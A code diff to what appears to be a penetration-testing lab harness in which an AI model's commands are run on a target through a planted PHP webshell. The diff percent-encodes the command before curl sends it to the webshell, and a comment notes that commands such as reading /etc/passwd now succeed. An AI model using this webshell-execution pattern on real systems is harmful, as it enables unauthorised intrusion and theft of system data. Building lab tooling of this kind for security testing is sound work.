@@ -12,6 +12,7 @@ import os
 import re
 import sys
 import time
+import urllib.parse
 
 from ._data import (
     _LAB_ADMIN_PASS,
@@ -675,6 +676,13 @@ def _lab_dispatch_inner(fn_name: str, fn_args: dict, dry_run: bool = False) -> s
         cmd_arg = fn_args.get("command", "id")
         if dry_run:
             return f"[DRY-RUN] webshell_exec: {cmd_arg}"
+        # cmd_arg is raw model text (often contains spaces/slashes/quotes) — must be
+        # percent-encoded before it's inserted into a URL query string. Un-encoded, curl
+        # rejects any command with a space with exit code 3 (malformed URL) and never even
+        # reaches the server, which silently looked identical to a failed exploit (empty
+        # output). Confirmed live 2026-07-02: "id"/"whoami" (no spaces) worked, "cat
+        # /etc/passwd" and nearly everything else came back empty until pre-encoded here.
+        cmd_encoded = urllib.parse.quote(cmd_arg, safe="")
         # Discover webshell from latest book listing, then exec command
         cmd = f"""
 IDX=$(curl -s http://{mbptl_host}:{mbptl_web}/)
@@ -682,7 +690,7 @@ LAST=$(echo "$IDX" | grep -oP 'detail\\.php\\?id=\\K\\d+' | sort -n | tail -1)
 DET=$(curl -s "http://{mbptl_host}:{mbptl_web}/detail.php?id=$LAST")
 SHELL_URL=$(echo "$DET" | grep -oP "http://[^\\"]+:\\d+/administrator/uploads/[^\\"]+\\.php" | head -1)
 echo "SHELL=$SHELL_URL"
-echo "webshell_exec result: $(curl -s "$SHELL_URL?cmd={cmd_arg}" 2>&1 | head -10)"
+echo "webshell_exec result: $(curl -s "$SHELL_URL?cmd={cmd_encoded}" 2>&1 | head -10)"
 """
         r = _lab_mcp_call(cmd, timeout=60)  # type: ignore[misc]
         return parse_sandbox_output(r.get("output", ""))[1] or "[webshell_exec: no output]"
